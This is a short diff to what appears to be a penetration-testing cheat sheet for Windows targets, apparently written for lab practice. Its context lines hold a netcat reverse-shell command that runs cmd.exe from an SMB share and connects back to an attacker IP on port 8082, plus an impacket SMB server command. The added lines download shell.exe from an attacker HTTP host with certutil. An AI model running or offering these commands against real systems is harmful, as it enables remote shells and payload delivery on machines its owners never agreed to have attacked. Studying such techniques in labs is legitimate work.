@@ -130,6 +130,9 @@ cmd.exe /c //192.168.49.67/Share/nc.exe -e cmd.exe 192.168.49.67 8082
 On Kali:
 python2 smbserver.py -smb2support Share /home/kali/
 
+#File Transfer via certutil
+cmd.exe /c certutil -urlcache -split -f http://192.168.118.3/shell.exe shell.exe
+
 #FTP (pyftpdlib client on Kali)
 # Ftp is generally installed on Windows machines
 # To make it interactive, use -s option
